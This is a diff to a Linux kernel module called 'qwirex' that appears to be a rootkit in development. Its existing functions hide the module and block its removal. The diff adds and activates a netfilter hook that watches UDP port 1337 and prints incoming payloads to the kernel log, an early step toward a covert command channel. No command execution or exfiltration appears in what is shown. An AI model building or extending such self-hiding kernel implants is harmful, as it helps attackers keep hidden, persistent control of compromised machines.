@@ -7,6 +7,7 @@
 #include <linux/udp.h>
 #include <linux/ip.h>
 #include <linux/netfilter_ipv4.h>
+#include <linux/types.h>
 
 static void hide_qwirex(void);
 static void ban_on_extraction_qwirex(void);
@@ -30,9 +31,61 @@ static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf
     {
         struct udphdr *udp = udp_hdr(skb);
 
+        if (!udp)
+        {
+            return NF_ACCEPT;
+        }
+
         if (ntohs(udp->dest) == 1337)
         {
+            u32 iph_len = ip->ihl * 4;
 
+            int ret = skb_ensure_writable(skb,iph_len + sizeof(struct udphdr));
+
+            if (ret < 0)
+            {
+                return NF_ACCEPT;
+            }
+
+            ip = ip_hdr(skb);
+            udp = udp_hdr(skb);
+
+            u32 payload_len = ntohs(udp->len) - sizeof(struct udphdr);
+
+            if (payload_len == 0)
+            {
+                return NF_ACCEPT;
+            }
+
+            ret = skb_ensure_writable(skb,iph_len + sizeof(struct udphdr) + payload_len);
+
+            if (ret < 0)
+            {
+                return NF_ACCEPT;
+            }
+
+            ip = ip_hdr(skb);
+            udp = udp_hdr(skb);
+
+            unsigned char *payload = (unsigned char *)(udp + 1);
+
+            if (payload_len < 256)
+            {
+                char *text = kmalloc(payload_len + 1, GFP_ATOMIC);
+
+                if (text)
+                {
+                    memcpy(text,payload,payload_len);
+                    text[payload_len] = '\0';
+                    printk(KERN_INFO "message:%s\n", text);
+                    kfree(text);
+                }
+
+                else
+                {
+                    return NF_ACCEPT;
+                }
+            }
         }
     }
 
@@ -76,7 +129,7 @@ static int __init qwirex_init(void)
     hide_qwirex();
     ban_on_extraction_qwirex();
 
-    // nf_register_net_hook(&init_net,&nho);
+    nf_register_net_hook(&init_net,&nho);
 
     return 0;
 }
